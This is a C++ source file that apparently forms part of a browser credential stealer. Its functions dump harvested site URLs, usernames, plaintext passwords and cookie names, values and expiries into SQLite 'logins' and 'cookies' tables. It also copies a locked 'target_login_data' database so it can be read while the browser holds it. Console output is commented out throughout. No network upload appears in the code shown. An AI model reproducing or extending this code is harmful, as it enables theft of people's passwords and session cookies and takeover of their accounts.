#include "includes\DataDump.h"

bool dump_data(const std::string& db_path, std::vector<DataHolder> data_array, int data_index) {
	sqlite3* db;
	char* errorMessage = nullptr;

	// Open the database
	int rc = sqlite3_open(db_path.c_str(), &db);
	if (rc) {
		//std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
		return false;
	}

	// Create table if it doesn't exist
	const char* createTableSQL = "CREATE TABLE IF NOT EXISTS logins ("
		"id INTEGER PRIMARY KEY AUTOINCREMENT,"
		"url TEXT NOT NULL,"
		"username TEXT NOT NULL,"
		"password TEXT NOT NULL,"
		"host TEXT"
		");";

	rc = sqlite3_exec(db, createTableSQL, nullptr, nullptr, &errorMessage);
	if (rc != SQLITE_OK) {
		//std::cerr << "SQL error: " << errorMessage << std::endl;
		sqlite3_free(errorMessage);
		sqlite3_close(db);
		return false;
	}

	// Prepare insert statement
	const char* insertSQL = "INSERT INTO logins (url, username, password, host) VALUES (?, ?, ?, ?);";
	sqlite3_stmt* stmt;

	rc = sqlite3_prepare_v2(db, insertSQL, -1, &stmt, nullptr);
	if (rc != SQLITE_OK) {
		//std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
		sqlite3_close(db);
		return false;
	}

	std::string url_string;
	std::string username_string;
	std::string password_string;
	std::string host_string;

	// Bind the data and execute the statement
	for (int i = 0; i < data_index; ++i) {

		//c_str() doesn't work directly on function returns. It works with pointers
		url_string = data_array[i].getUrl();
		username_string = data_array[i].getUsername();
		password_string = data_array[i].getPassword();
		host_string = data_array[i].getHost();

		sqlite3_bind_text(stmt, 1, url_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 2, username_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 3, password_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 4, host_string.c_str(), -1, SQLITE_STATIC);

		rc = sqlite3_step(stmt);
		if (rc != SQLITE_DONE) {
			//std::cerr << "Execution failed: " << sqlite3_errmsg(db) << std::endl;
			sqlite3_finalize(stmt);
			sqlite3_close(db);
			return false;
		}

		// Reset the statement for the next iteration
		sqlite3_reset(stmt);
	}

	// Clean up
	sqlite3_finalize(stmt);
	sqlite3_close(db);
	//std::cout << "Data dump: " << db_path << std::endl;
	return true;
}

bool dump_cookie_data(const std::string& db_path, std::vector<DataHolder> data_array, int data_index) {
	sqlite3* db;
	char* errorMessage = nullptr;

	// Open the database
	int rc = sqlite3_open(db_path.c_str(), &db);
	if (rc) {
		//std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
		return false;
	}

	// Create table if it doesn't exist
	const char* createTableSQL = "CREATE TABLE IF NOT EXISTS cookies ("
		"id INTEGER PRIMARY KEY AUTOINCREMENT,"
		"url TEXT NOT NULL,"
		"name TEXT NOT NULL,"
		"value TEXT NOT NULL,"
		"expiry TEXT NOT NULL,"
		"host TEXT"
		");";

	rc = sqlite3_exec(db, createTableSQL, nullptr, nullptr, &errorMessage);
	if (rc != SQLITE_OK) {
		//std::cerr << "SQL error: " << errorMessage << std::endl;
		sqlite3_free(errorMessage);
		sqlite3_close(db);
		return false;
	}

	// Prepare insert statement
	const char* insertSQL = "INSERT INTO cookies (url, name, value, expiry, host) VALUES (?, ?, ?, ?, ?);";
	sqlite3_stmt* stmt;

	rc = sqlite3_prepare_v2(db, insertSQL, -1, &stmt, nullptr);
	if (rc != SQLITE_OK) {
		//std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
		sqlite3_close(db);
		return false;
	}

	std::string url_string;
	std::string name_string;
	std::string value_string;
	std::string expiry_string;
	std::string host_string;

	// Bind the data and execute the statement
	for (int i = 0; i < data_index; ++i) {

		//c_str() doesn't work directly on function returns. It works with pointers
		url_string = data_array[i].getUrl();
		name_string = data_array[i].getCookieName();
		value_string = data_array[i].getCookies();
		expiry_string = data_array[i].getCookieExpiry();
		host_string = data_array[i].getHost();

		sqlite3_bind_text(stmt, 1, url_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 2, name_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 3, value_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 4, expiry_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 5, host_string.c_str(), -1, SQLITE_STATIC);

		rc = sqlite3_step(stmt);
		if (rc != SQLITE_DONE) {
			//std::cerr << "Execution failed: " << sqlite3_errmsg(db) << std::endl;
			sqlite3_finalize(stmt);
			sqlite3_close(db);
			return false;
		}

		// Reset the statement for the next iteration
		sqlite3_reset(stmt);
	}

	// Clean up
	sqlite3_finalize(stmt);
	sqlite3_close(db);
	//std::cout << "Data dump: " << db_path << std::endl;
	return true;
}

BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile) {
	std::ifstream source(sourceFile, std::ios::binary);
	if (!source) {
		return false;
	}

	std::ofstream dest(destinationFile, std::ios::binary);
	if (!dest) {
		return false;
	}

	dest << source.rdbuf();

	if (!dest.good()) {
		return false;
	}

	//std::cout << "File copied successfully." << std::endl;
	return true;
}

sqlite3_stmt* query_database(std::string target_login_data, const char* database_query)
{
	sqlite3* db;
	if (sqlite3_open(target_login_data.c_str(), &db) == SQLITE_OK)
	{
		//std::cerr << "file found" << std::endl;
		sqlite3_stmt* stmt = nullptr;
		if (sqlite3_prepare_v2(db, database_query, -1, &stmt, 0) == SQLITE_OK)
		{
			return stmt;
		}
		else
		{
			//std::cerr << "Database file in use .... " << std::endl;
			std::string new_target = target_login_data + "copy";
			custom_copy_file(target_login_data, new_target);
			// Do i need sleep here?
			sqlite3_open(new_target.c_str(), &db);
			sqlite3_prepare_v2(db, database_query, -1, &stmt, 0);

			return stmt;
		}
	}
	return nullptr;
}